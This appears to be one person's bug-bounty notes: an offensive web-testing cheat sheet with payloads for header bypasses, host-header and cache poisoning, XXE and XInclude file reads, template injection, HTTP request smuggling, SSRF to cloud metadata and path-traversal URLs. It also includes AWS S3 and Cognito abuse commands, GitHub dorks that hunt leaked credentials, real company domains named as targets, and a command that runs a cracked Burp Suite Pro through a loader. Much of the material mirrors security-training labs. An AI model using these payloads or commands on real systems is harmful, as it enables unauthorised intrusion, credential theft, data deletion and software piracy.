


================   https://dorks.faisalahmed.me    bughunting site automatic



CWE-20: Improper Input Validation
CWE-22: Path Traversal
CWE-77: Command Injection
CWE-78: OS Command Injection
CWE-79: Cross-site Scripting (XSS)
CWE-80: Basic XSS
CWE-89: SQL Injection
CWE-90: LDAP Injection
CWE-94: Code Injection
CWE-99: HTTP Response Splitting
CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers
CWE-120: Buffer Copy without Checking Size of Input
CWE-126: Buffer Overread
CWE-131: Incorrect Calculation of Buffer Size
CWE-134: Uncontrolled Format String
CWE-190: Integer Overflow or Wraparound
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
CWE-209: Information Exposure Through an Error Message
CWE-213: Intentional Information Exposure
CWE-215: Information Exposure Through Debug Information
CWE-235: Improper Handling of Extra Parameters
CWE-250: Execution with Unnecessary Privileges
CWE-284: Improper Access Control
CWE-306: Missing Authentication for Critical Function
CWE-307: Improper Restriction of Excessive Authentication Attempts
CWE-311: Missing Encryption of Sensitive Data
CWE-312: Cleartext Storage of Sensitive Information
CWE-319: Cleartext Transmission of Sensitive Information
CWE-352: Cross-Site Request Forgery (CSRF)
CWE-362: Race Condition
CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition
CWE-384: Session Fixation
CWE-400: Uncontrolled Resource Consumption
CWE-416: Use After Free
CWE-426: Untrusted Search Path
CWE-434: Unrestricted Upload of File with Dangerous Type
CWE-472: External Control of Assumed-Immutable Web Parameter
CWE-476: NULL Pointer Dereference
CWE-494: Download of Code Without Integrity Check
CWE-502: Deserialization of Untrusted Data
CWE-521: Weak Password Requirements
CWE-522: Insufficiently Protected Credentials
CWE-601: URL Redirection to Untrusted Site (‘Open Redirect’)
CWE-611: Improper Restriction of XML External Entity Reference (XXE)
CWE-614: Sensitive Cookie in HTTPS Session Without ‘Secure’ Attribute
CWE-732: Incorrect Permission Assignment for Critical Resource
CWE-759: Use of a One-Way Hash without a Salt
CWE-798: Use of Hard-coded Credentials
CWE-807: Reliance on Untrusted Inputs in a Security Decision
CWE-918: Server-Side Request Forgery (SSRF)


For Graph QL :

Bounty targets at one place :::++https://github.com/arkadiyt/bounty-targets-data

https://github.com/dn0m1n8tor/learn365


cd C:\Program Files\Java\jdk-17.0.2\bin
                             
java --illegal-access=permit -Dfile.encoding=utf-8 -javaagent:"C:\Users\dev\Desktop\New_loader.jar" -noverify -jar "C:\Users\dev\Desktop\burpsuite_pro_v2022.1.1.jar"

My Cheat seat for finding most coomon bug at very first sight:::::

https://edoverflow.com/2019/ci-knew-there-would-be-bugs-here/ 

https://www.youtube.com/watch?v=l0YsEk_59fQ      Read this artical

http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

curl https://internetdb.shodan.io/199.212.246.4        for IP info on shodan

bbscope godfatherarva chaos 


updatedb for update the db usefull for locate command


Setting mail in ubuntu server https://tonyteaches.tech/postfix-gmail-smtp-on-ubuntu/


https://wordlists.assetnote.io/

https://subdomainfinder.c99.nl/scans/2021-09-09/nab.com.au

 000>>  https://bgp.he.net
 
  hping3 -S 199.212.246.34 -c 100 -p ++1
 
 
 amass enum -d domain.com  for subdomain enum
 
 amass enum -df file.txt   subdomain for file.txt where root domain are


 altdns -i subss -o subsss -w /home/kali/wordlists/words.txt -r -s altdns

 dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o resolvers.txt


 uncover -q 'org:"Example  Inc."' | httpx | nuclei

 
 
 
 For hash extender 
 
 docker run -Pit alpine
 
 apk add build-base make curl git openssl-dev
 
 git clone https://github.com/iagox86/hash_extender.git
 
 cd hash_extender 
 
 make
 
 Docker command for wordpress:
 
 docker run -it --rm wpscanteam/wpscan --url https://press-smoke.hulu.com/




 If you want to convert josn in xml for xml injection testin then use following site



=====>>>>> https://www.freeformatter.com/json-to-xml-converter.html
 
 
 >>>>>>>  Use pastbin for host some data linke html , xxe, cors
 
================================================================================================




 
Some rate limiting bypass::::::

X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Forwarded-Host: 127.0.0.1

Some 401 bypass:

X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Host: localhost

If the path is protected you can try to bypass the path protection using these other headers:


X-Original-URL: /admin/console
X-Rewrite-URL: /admin/console



=================================================================================================
https://bugbountyhunter.com/

https://danielmiessler.com/projects/webappsec_testing_resources/     Methodology For bugs



0  >>>> IDOR bypass for 401/403


       >> Wrap ID with an array {“id”:111} --> {“id”:[111]}
       >> JSON wrap {“id”:111} --> {“id”:{“id”:111}}
       >> Send ID twice URL?id=<LEGIT>&id=<VICTIM>
       >> Send wildcard {""user_id"":""*""}






1  >>>>   No Rate Limiting  & Delete account without confirmation 


2  >>>>   Long Paaword Dos Attack   and Account lockout application dos


3  >>>>   Host header attack

        - Password reset poisoning from change the host to evil.com 


                - Password reset poisoning by X-Forwarde-Host to evil.com

                - Password reset poisoning through danglink markup and string port in host header '<a href="//xjk3h4uo18lryvi7yv3jaiwuoluji8.burpcollaborator.net/?


         >> Host header auth bypasss
                 
                 Some times website restrict their functionality to internal user only. . You can bypass this by making simple modification in 
                 Host header.
                 
                 Host: localhost
                 Host: 127.0.0.1
                 
                 
                 >> Routing based SSRF
                 
                 Put your burp coalborator domain in host header if request in burp then may be routing based SSRF
                 
                 You can brute force public ip( like 192.168.0.X) by intruder in burp pro
                 
                 
                >> SSRF ny flawd request parsing

        If you use host with your burp colob url then site is block your url But if you use absolute url then 
        bypass the parsing rule 

        GET https://your-lab-id.web-security-academy.net/
        Host: your-collaborator-id.burpcollaborator.net


                >> SSRF via malformed request line 

                 GET @private-intranet/example HTTP/1.1
                 

                 

        - If you access the webiste after change the host header then may be host header injection 

                - If error "Invalid host header" then may be CDN is there

                - Instead of receiving an "Invalid Host header" response, you might find that your request is blocked as a result
                  of some kind of security measure. For example, some websites will validate whether the Host header matches the
                  SNI from the TLS handshake. This doesn't necessarily mean that they're immune to Host header attacks.
                  
        - If you are also able to supply a non-numeric port, you can leave the domain name untouched to ensure that you 
                  reach the target application, while potentially injecting a payload via the port. 

        - You can try with subdomain of that site in host header 

                - Different systems and technologies will handle this case differently, but it is common for one of the two 
                  headers to be given precedence over the other one, effectively overriding its value. When systems disagree 
                  about which header is the correct one, this can lead to discrepancies that you may be able to exploit

        - The ambiguity caused by supplying both an absolute URL and a Host header can also lead to discrepancies between
          different systems. Officially, the request line should be given precedence when routing the request but, in 
                  practice, this isn't always the case. You can potentially exploit these discrepancies in much the same way as 
                  duplicate Host headers.
                  
                - You can also uncover quirky behavior by indenting HTTP headers with a space character. Some servers will 
                  interpret the indented header as a wrapped line and, therefore, treat it as part of the preceding header's v
                  alue. Other servers will ignore the indented header altogether.   
                  
                  GET /example HTTP/1.1
              Host: bad-stuff-here
          Host: vulnerable-website.com
                  
                  
                - You can sometimes use X-Forwarded-Host to inject your malicious input while circumventing any validation on 
                  the Host header itself.  
                  
                  Although X-Forwarded-Host is the de facto standard for this behavior, you may come across other headers that
                  serve a similar purpose, including: 
                   
                   - X-Forwarded-Host: 
                   - X-Host:
                   - X-Forwarded-Server:
                   - X-HTTP-Host-Override:
                   - Forwarded:
                   
                - You can use Burp Collaborator to help identify these vulnerabilities. If you supply the domain of your 
                  Collaborator server in the Host header, and subsequently receive a DNS lookup from the target server or 
                  another in-path system, this indicates that you may be able to route requests to arbitrary domains.  



        - 

                  
                  

4  >>>>   Oauth  Login CSRF

https://busk3r.medium.com/oauth-2-0-hacking-simplified-part-2-vulnerabilities-and-mitigation-d01dd6d5fa2c


5  >>>>   Oauth  account connect CSRF


6  >>>>   Oauth Url Redirect , try to this with open redirect and LFI


7  >>>>   Oauth Url Redirect account takeover

           


8  >>>>   Pre Account Takeover 

        > If the application does not require email verification on account creation, try creating an account with a victim’s email address and attacker password before the victim has registered. If the victim then tries to register or sign in with a third party, such as Google, it’s possible the application will do a lookup, see that email is already registered, then link their Google account to the attacker created account. This is a “pre account takeover” where an attacker will have access to the victim’s account if they created it prior to the victim registering.

        > If an OAuth app does not require email verification, try signing up with that OAuth app and then change the email address with a victim’s email address. The same issue as above could exist, but you’d be attacking it from the other direction and getting access to the victim’s account for an account takeover.



9  >>>>   Obscure Email vulnerabilty  if app register account as ran.veer2354@gmail.com gmail treated is as ranveer2354@gmail.com


10  >>>   Exposed Source Code control if find ---> .git, .gitignore , .bzr , .svn , .hg , CVS

          Use gittool in automation for large number of domains
                  

11  >>>   HTTPoxy attack if you find common cgi files on url or cgi like environment tools in burp


12  >>>   Server Side Includes if you find .shtml , .stm , shtm



13  >>>   Apache Struts if you find --> struts error, .action , .do , .java , .out , .bat , .seam , .sh , .bson , .pl , .pm


14  >>>   Exif Geolocation not stripped from uploaded image


15  >>>   Apache byte Range Application layer Dos if verion 2.2.x 


16  >>>   webmin unauthenticated rce in password_change.cgi on 10000 port


17  >>>   Untrusted source js exploitation


18  >>>   F5 Big_IP Rce if find --> /tmui

18.1 >>> JIRA  vulnerabilities-and-mitigation-d01dd6d5fa2c

        ---> Use Jira-Scan tool for SSRF vulnerabilty
                ---> rce in contact adminitrator.jsp file
                ---> Jira misconfig information discloser find on google

          
          Pre-Authorization Limited Arbitrary File Read in Jira Server - CVE-2020-29453
           
                  Limited Remote File Read in Jira Software Server - CVE-2021-26086 
                  
                  https://twitter.com/harshbothra_/status/1346109605756116995?lang=en
                  
                  https://github.com/ColdFusionX/CVE-2021-26086
                   
              https://github.com/sushantdhopat/JIRA_testing
        

                  For jira all cves here 
                  
                  https://jira.atlassian.com/browse/JRACLOUD-75473?jql=text%20~%20%22cve%22
                  
                  


19  >>>   HSTS on ssllabs test


20  >>>   Account Lockout for 24 hour in brute force then vulnerabilty


21  >>>   Test for blind xss 


22  >>>   Identity Testing::

           ---> You delete your account and your data still on application then vulnerabilty
                   ---> Try to signup as admin user 
                   ---> Try to signup with another user account
                   ---> 
                   
                   
23  >>>   Authentication Testting::
                  
                                  
                        -->     Authentication bypass via information disclosure
            If in response see own IP then may be possible this attack

                        https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

         
                   ---> Always testing for default creds
                   ---> Vulnerable remember me fuctionality
                   ---> weak password reset functionality
                   ---> weak security question
                   
                   
24  >>>  Application server vulnerabilty ::
      
               ---> Testing default credentials if using open source or coomercial software
                   ---> Dangerous PUT http method allowed only if we put a file on server from this method 
                   ---> Application server trated as proxy and we can try CONNECT method to our server
                   ---> 
                   

25  >>>  Web cache deception 


25(1) >>> Web cache poisoning
         
      ::;::>>>>  Design flaws:::

                ---> Using web cache poisoning to deliver an XSS attack

                     X-Forwarded-Host: a."><script>alert(1)</script>"
                         
                ---> Using web cache poisoning to exploit unsafe handling of resource imports
          
                    X-Forwarded-Host: evil-user.net

        ---> Using web cache poisoning to exploit cookie-handling vulnerabilities.Cookies are often used to dynamically
                generate content in a response



           Place a suitable XSS payload in the fehost cookie, for example:
           fehost=someString"-alert(1)-"someString

        ---> Using multiple headers to exploit web cache poisoning vulnerabilities

                    X-Forwarded-Host: evil.com
                        X-Forwarded-Proto: nohttps


                ---> Exploiting responses that expose too much information. 
                     One such example is when responses contain information about how often the cache is purged or how old the
                         currently cached response is: 
                         
                HTTP/1.1 200 OK
                Via: 1.1 varnish-v4
                Age: 174
                Cache-Control: public, max-age=1800

        ---> Targeted web cache poisoning using an unknown header

                Find header from param miner extension 

                  X-Host: evil.com
                  
                ---> Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria 

                  - Use Param Miner to identify that the X-Forwarded-Host header is supported. 
                  - Add the header Access-Control-Allow-Origin: * to your evil site for cors 

          - payload on evil server 
             
                     {
                     "country": "<img src=1 onerror=alert(document.cookie) />"
                     }                   
                   
                   
                   
                   
                  >>>Implementation flaws>>
                  
                  
                  
                  
                ---> Web cache poisoning via an unkeyed port

        -If redirect was dynamically generated based on the Host header . This might enable you to construct a deniel of
         service by simply adding an arbitrary port to the request . All the users who browsed to the home page would 
         redirect to a dud port , taking down the home page  until the cache is expired .


        ---> Web cache poisoning via an unkeyed query string

        -       To identify a dynamic page, you would normally observe how changing a parameter value has an effect on the 
                response. But if the query string is unkeyed, most of the time you would still get a cache hit, and therefore 
                an unchanged response, regardless of any parameters you add. Clearly, this also makes classic cache-buster 
                query parameters redundant.

                - Fortunately, there are alternative ways of adding a cache buster, such as adding it to a keyed header that 
                doesn't interfere with the application's behavior. Some typical examples include: 

                Accept-Encoding: gzip, deflate, cachebuster
                Accept: */*, text/cachebuster
                Cookie: cachebuster=1
                Origin: https://cachebuster.vulnerable-website.com


                - Another approach is to see whether there are any discrepancies between how the cache and the back-end 
                normalize the path of the request. As the path is almost guaranteed to be keyed, you can sometimes exploit 
                this to issue requests with different keys that still hit the same endpoint. For example, the following 
                entries might all be cached separately but treated as equivalent to GET / on the back-end: 

                 Apache: GET //
         Nginx: GET /%2F
         PHP: GET /index.php/xyz
         .NET GET /(A(xyz)/ 

        We can use following apyload 

                GET /?evil='/><script>alert(1)</script>

        ---> Web cache poisoning via an unkeyed query parameter\

                -If we use any query parameter we notice that you get cache miss every time change in the query string
                This indicate the this is the part of cache key .Also notice that the query string is reflected in the responce


        -Go to param miner to find unkeyed parameter like utm_content
     
        - GET /?utm_content='/><script>alert(1)</script>

        - Once your payload is cached , remove the utm_content parameter , right-click on the request , and send request
         again to see your apyload is cached on home page

                 
                  
                ---> Web cache poisoning by parameter cloaking

        - If site cache excludes a certain parameter from the cache key. There is also inconsistent parameter parsing 
                between the cache and the cache and the backend server . 

                - We can find it by Param miner>>Guess params>>Guess everything

        - If site is using JSONP for the cross domain request ,this will contain a callback parameter 

        - Final payload is GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)


       ---> Exploiting a fat GET support 
           
            - If site accepts GET request that have body. but does not include the body in the cache key

        - GET /js/geolocate.js?callback=setCountryCookie
          …
          callback=alert(1)
                  
                  
           ---> URL normalization
             
                 - Browse to any non-existent path, such as GET /random. Notice that the path you requested is reflected 
                 in the error message
                 
                 - GET /random</p><script>alert(1)</script><p>foo
                 
                 
           ---> Cache key injection
           
             - 
                 
          ---> Internal cache poisoning
          
             - If the response reflects a mixture of both input from the last request you sent and input from previous request
                 ,this is a key indicator .
                 
                 - If input is reflected in resposes in multiple distinct page ,in particuler on pages in which you never tried inject 
                 your input .
                 
                 
                 
                 
                  

26  >>>  Ticket Trick bug hunting : Company uses Slack ,Yammer, fb for internal communication then

            ---> If there is tikcer issue ticket id creation for thread
                        ---> Through form or contact if application create your email for communication like support+ticketid@any.com
                        ---> If application uses slack then goto slack and register you as support+ticket@any.com 
                        ---> If succefull signup then you can listen internal chats



27  >>>  Evil way to account takeover:
    
                ---> Create Two same look like email 
                        ---> Compsoe email from one mail you will get ticket id for change your email
                        ---> Then go to chat system and contact if email change then vulnerability



28  >>>  Shellshock bash rce for --> file.cgi, cgi-bin


29  >>>  Nginx Range filter overflow 


30  >>>  Adobe coldfusion vulnerabilty --> .cfml , CFIDE  , 


31  >>>  Docker api Unauthenticated rce at port 2275, 2276


32  >>>  Xml external entity and xml tag injection

32(1) >> XInclude attacks :
     
       Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse 
           the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which 
           is then processed by the backend SOAP service.

       In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document 
           and so cannot define or modify a DOCTYPE element. However, you might be able to use XInclude instead. XInclude 
           is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an 
           XInclude attack within any data value in an XML document, so the attack can be performed in situations where you 
           only control a single item of data that is placed into a server-side XML document.

       To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that 
           you wish to include. For example:
           
           
           
      <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/></foo>
          
       You can use below payload , when entit is not accepted

       <ybp xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://a1cqa1g0av62cr8djc1k4s96dxjq7j97av2iz6o.burpcollaborator.net/foo"/></ybp>   
          
          XXE with file upload 
          
          Create a local SVG image with the following content:
          
          <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
          
         


33  >>>  Sql injection


34  >>>  Double order sql injection


35  >>>  Postgresql rce On port 5432 need tool pgadmin try with default creds


36  >>>  PHPmyadmin authenticated rce on php<5.4


37  >>>  MySql authentication bypass 



38  >>>  DnsZone transfer vulnerabilty

         dig @8.8.8.8 victim.com
                 dig @ns1.server axfr victim.com
                 


39  >>> HTTP request smugling 
     
         https://www.youtube.com/watch?v=XC48irGjKNc
         https://portswigger.net/web-security/request-smuggling

     HTTP Request Smuggling (HRS) is a web application vulnerability that enables an attacker to craft a single request 
         that hides a second request within the body of the first request.
         
         CL= Content-Length
         TE= Transfer-Encoding
         
         
     ==>if an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the 
         following will often cause a time delay: 
         
         POST / HTTP/1.1
     Host: vulnerable-website.com
     Transfer-Encoding: chunked
     Content-Length: 4

     1
     A
     X
         
     -------------------------------------------------------------------------
         
         ==>>If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following
         will often cause a time delay: 
         
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Transfer-Encoding: chunked
    Content-Length: 6

    0

    X

        -------------------------------------------

        ==> Confirming CL.TE vulerabilities using differential responses
        To confirm a CL.TE vulnerability, you would send an attack request like this: 

        POST /search HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 49
    Transfer-Encoding: chunked

    e
    q=smuggling&x=                            
    0

    GET /404 HTTP/1.1
    Foo: x
        ----------------------------------------------------------------
        To confirm a TE.CL vulnerability by differential response, you would send an attack request like this: 

        POST /search HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 4
    Transfer-Encoding: chunked

    7c
    GET /404 HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15

    x=1
    0
        -------------------------------------------------------------

        ==>TE.TE Behavior: ofuscating the TE header 

        Here both the servers support TE header but , one of the server can be induced not to process it by obfuscating
        the header in some way.

        Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated 
        Transfer-Encoding header, the remainder of the attack will take the same form as for the CL.TE or TE.CL 
        vulnerabilities already described. 

        Some ways of obfuscate Transfer-Encoding:

        Transfer-Encoding: xchunked

    Transfer-Encoding : chunked

    Transfer-Encoding: chunked
    Transfer-Encoding: x

    Transfer-Encoding:[tab]chunked

    [space]Transfer-Encoding: chunked

    X: X[\n]Transfer-Encoding: chunked

    Transfer-Encoding
    : chunked


        Note:: After time delay technique if site is vulernable then you can use 

        Host: vulerabl-site
        X-Forwarded-For: burp-colab.net 

        If you get dns lookup in burp then site is vulerable


        If found TE.CL then for exploit you should use size of cunke before the second request







39(1) >>> Exploiting    HTTP request smugling

         >>>Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
                 
                 There's an admin panel at /admin, but the front-end server blocks access to it.  we can access it by HTTP smugle
                 
                 Issue the following request twice:
                 
         POST / HTTP/1.1
         Host: your-lab-id.web-security-academy.net
         Content-Type: application/x-www-form-urlencoded
         Content-Length: 54
         Transfer-Encoding: chunked

         0

         GET /admin HTTP/1.1
         Host: localhost
         X-Ignore: X
                 
            >>>Exploiting HTTP request smuggling to reveal front-end request rewriting

                perform the following steps: 

                -Find the POST request that reflects the value of a request parameter into application's response 
                -Shuffle the parameterso that the reflected parameter appears in the message body 
                -Smuggle this reques to the back-end server 
                POST / HTTP/1.1

        Host: acf61f3a1e270e0ec08a1f0200900069.web-security-academy.net
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 124
        Transfer-Encoding: chunked

        0



        POST / HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 200
        Connection: close

        search=test

                >>>Exploiting HTTP request smuggling to perform web cache poisoning
                If any part of the front-end infrastructure performs caching of content, then it might be possible to poison 
                the cache with the off-site redirect response. This will make the attack persistent, affecting any user who 
                subsequently requests the affected URL. 

                POST / HTTP/1.1
        Host: ac501fa01f560f6ac0eaf2a400a700b1.web-security-academy.net
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 198
        Transfer-Encoding: chunked

        0

        GET /post/next?postId=3 HTTP/1.1
        Host: exploit-acee1f881f3e0f52c02cf23201410086.web-security-academy.net
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 10

        x=1



                >>








40  >>>  Insecure CORS


41  >>>  URL Redirection 


42  >>>  Parameter Tampering


43  >>>  CSRF vulnerability   & Check for IDOR vulnerability


44  >>>  SSRF vulnerability:: if found parameter like ; uri=, url= , file= , 

           ---> SSRF to RFI to Shell
                   ---> SSRF to LFI use file:///,  dict:///,  sftp:/// , ldap ;/// , ldaps:/// , ldapi:/// , tftp:///
                   ---> SSRF to internal port scan
                   ---> SSRF if any application converting file type  pdf to image or html
                   ---> SSRF to retrive cloud metadata if application using cloud 
                        --> for amazone   http://169.254.169.254/latest/metadata
                            --> for Google    http://metadata.google.internal/computeMetadata/v1
                            --> Azure         http://169.254.169.254/metadata
                          
444  >>  AWS pentesting

          You can also use s3scanner tool 


          ---> aws set to list for everyone
                     aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
                         
                         
          ---> aws list for any aws user 
                     aws s3 --profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
                         
                         
                  ---> Download this whole S3 bucket using
             aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
             
                  --->  Delete Bucket
                         aws s3 rb s3://my-awesome-new-bucket --force
                  
                  --->  Download S3 Object to Local               
                     aws s3 cp s3://my-awesome-new-bucket .
             download: ./backup.tar from s3://my-awesome-new-bucket/backup.tar
                         
                  --->   Upload Local File as S3 Object
                      
                         aws s3 cp backup.tar s3://my-awesome-new-bucket
             upload: ./backup.tar to s3://my-awesome-new-bucket/backup.tar
                         
                  --->   Delete S3 Object                 
                     aws s3 rm s3://my-awesome-new-bucket/secret-file.gz
             delete: s3://my-awesome-new-bucket/secret-file.gz



  For ACL testing you can use following command:: aws s3api get-bucket-acl --bucket bucket-name --no-sign-request





  >>>>> AWS Cognito Misconfiguration :::::::::::::::::::::::::::::::::::::: 

         https://www.youtube.com/watch?v=TuiDJ5Ii6MU
     


     aws congnito , you can add user signup and signin feature and control access to your web and mobile applications .

     amazone cognito provides a identiry store that scales to millions of user supports social and enterprize ferdaration.


   >>>Intro to aws cognito 

     > User Pools : allows sign-in and signup functionality 
     > Identity Pools : allows authenticated and unauthenticated users to access aws resources using temporary aws credetials..


  >>>>> Security misconfiguration 1 > Unauthrized access to aws services due to liberal aws credentials 

      Try to fetch aws credentials as unauthenticated user 

      To generate the aws credentials , we need to find Identiy Pool Id which mostly hardcoded in source code in bundle js or HTTP respoce , other usefull info you can find 
      :
      >client id
      >user pool id
      >region

     Command $: aws cognito-identity get-id --identity-pool-id <identity-pool-id> --region <region>

      above commnad give identity-id 

            $: aws cognito-identity get-credentials-for-identity --identity-id <identity-id> --region <region>



 >>>>>> Security misconfiguration 2 > Authentication bypass due to signup API action 

      Applicatin not offering user signup only supporting administrative provision of accounts could be vulnerable due to not disabling signup API action

      Try to signup with following command :

      $: aws cognito-idp signup --cliet-id 4aa41hr4s2apkli7ivikgf1afg --username ranveer2354@gmail.com --password 8890@#%$devD --region us-east-1



>>>>> Security misconfiguration 3 > Priviledge escalatin through writable user attributes 

    Fetch user attribute after login account :

     $:aws cognito-idp get-uer --region <region> --access-token <token>

    Updating user attributes 

     $:aws cognito-idp update-user-attributes --region <region> --access-token <token> --update-attributes Name=<name> ,value=<value>



>>>>> Security misconfiguration 4 > Updating email attributes before the verifivation 

    Even with email verfication enabled, most application update the email attribute to new unverfied email address. From this user can login with new email without verified .




                         
                         
                         
                          
45  >>>  SOAP if we found ?wsdl file then we can use SOAP UI tool in windows


46  >>>  XPATH injection check for single and double quote and find always true statement and always false statement


47  >>>  Serialization vulnerability::
   
        ---> java serialization
                ---> Php serialization
                ---> .Net serialization


48  >>>  Template Injection 
            

            ---> {{7*7}}
                ---> ${7*7}
                ---> %{7*7}
                ---> #{7*7}
                ---> %25{7*7}
                ---> {7*7}
                ---> ${{48*53}}`'";--><sCRIpt sRc=//your.oob></sCRIpt>


49  >>>  XSLT it is like xml document 
       
            --->XSLT to file read
                ---> XSLt to rce


50  >>>  Padding Oracle attack 


51  >>>  Hash Lenght Extension attack


53 >>>Prototype pollution

Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects.
An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.




https://www.youtube.com/watch?v=Gv1nK6Wj8qM                nahamsec video for prototype

https://www.youtube.com/watch?v=J3MIOIqvV8w                 good video for revison
https://www.youtube.com/watch?v=yDmOXhr8wmw

  >> a={}
Object {  }
>> b={}
Object {  }
>> b.__proto__.foo='bar';
"bar"
>> b.foo
"bar"
>> c={}
Object {  }
>> c.foo
"bar"
>> a.foo
"bar"




52  >>>  Git hub sensetive data exposes 

   Use truflehog tool 
   

    Go to site >>> https://github.com/random-robbie/keywords/blob/master/keywords.txt 

        1---> "company" security_credentials          Ldap 
                2---> "company" connectionstring              Database creds
                3---> "company" JDBC                          database creds
                4---> "company" ssh2_auth_password             Authbyapss
                5---> "company" send_keys or send, keys       other keywords
                6---> "company" langauge:python keys 
                7---> "fasken.com" pasword NOT iaa.hasken.com
        8---> org:fasken pasword
                9---> user:ranveer paswd
            10--> 






54.>>>>> Google Dorking===========================++++++++++++++++++++++++++++
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.>>



site:help.financialforce.com ext:htm        Shows the extension in html from gooogle

 "            "     "        ext:xlsx
 
 "                      "    ext:pdf intitle:Setup
 
 "                    "      ext:php intitle:Setup
 
 ""                      "   ext:jsp
 
 
 
 
site:.nab.com.au intitle:"

site:.financialforce.com inurl:img_url                       Shows url for ssrf

site:.financialforce.com inurl:*/admin/*                     Shows the admin pages

site:.financialforce.com inurl:*/api?*

site:*.dell.com -www                                        Remove the www subdomains from the output        


site:"target[.]com" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess



55..>>>>>>>>> Reverse Proxies


1. Path parameters in java based servers
  
  > Similar to query strings (?a=1&b=2) but delimmited by ";"
  > Example: "/index.jsp;x=1;y=2" Consist of path parameter x and y
  > Having extraneous ";" also wonot affect loading the file
  > Example: "/index.jsp;" would return "/index.jsp" content
  

2. Path parameters in Tomacat
 
 >> Tomacat parses the path in the following manner
 
  > Remove path parameters -begining from ";" until position of "/"
    Example:
           "/xyz;test=1/index.jsp" would become "/xyz/index.jsp"
           "/xyz;/index.jsp" would become "/xyz/index.jsp"
  > Url decode the path
  >Normalise the path ( basically resolve /../ or multiple /// etc.)

  
3. Nginx as a Reverse Proxy

  Example Rule1.
  
  > nginx.conf:
  server{
  
  location /app1{
       proxy_pass http://internal.app;
           }
   }
   
   Any HTTP request to Nginx server with path /app1<anything here> would be proxied to http://interanl
   .app/<anthing here>
   
   Example Rule2.
   
   nginx.conf;
   server {
   
   location ~ ^/app2/(.*\.jpg)${                     #Matches any fileending with .jpg in /app2/ directory
        proxy_pass http://internal.app/app2/$1;
                }
        }

        Any HTTP request to nginx server with path /app2/<anything>.jpg would be proxied to
        http://interanl.app/app2/<anything>.jpg 





>>>>>Processing done by nginx :

  > Url decode once & normalize the path eg. /../ , %2f..%2f etc (/.. is not normalize) before 
  matching the location rule
  
  >Ignore "#" URI fragment part
  
  >doesnot allow %2f as the first slash and ////(multiple slash) become /
  
  >if root trailing '/' is missing in proxy_pass argument, unprocessed raw path is send as a is





=======>>>>>>First senorio where nginx is reverse proxy and tomcat is backend server

   
        >>suppose there exists an unauth internal API/path/file or say Tomcat manager is with default creds

        >>Remember the http://internal.app:8080 services is not exposed externally

        >>http://site.com/app/../ would be processed ny nginx to '/' and look for the rule '/' instead of "/app"

        >>Therefore , /../ of %2f..%2f or similar variation won't work

        ==>> Exploit for this is http://site.com/app/..;/secretapi/users
                                 http://site.com/app../secretapi/users
                                     http://site.com/static../setting.py       # we can load file witch have creds
                                                         http://site.com/protcted//../
 
                                   
                                                   
https://www.example.com..;/api/v1/users
https://www.example.com/api..;/v1/users
https://www.example.com/api/v1..;/users
https://www.example.com/..;api/v1/users
https://www.example.com/api/..;v1/users
https://www.example.com/api/v1/..;users
https://www.example.com/api/v1/users/..;
https://www.example.com/api/v1/users/..;/                                                        
                                                         
                                                         
                                                         
                                                         
                                                         
=======>>>>>>>>>>Apache as a reverse proxy

                Processing done by apache :
        
       >Url decodes once & mormalize the path before matching location rule
           
       >////(multiple slash) becomes / if it is in the begining eg ///path=> /path
            
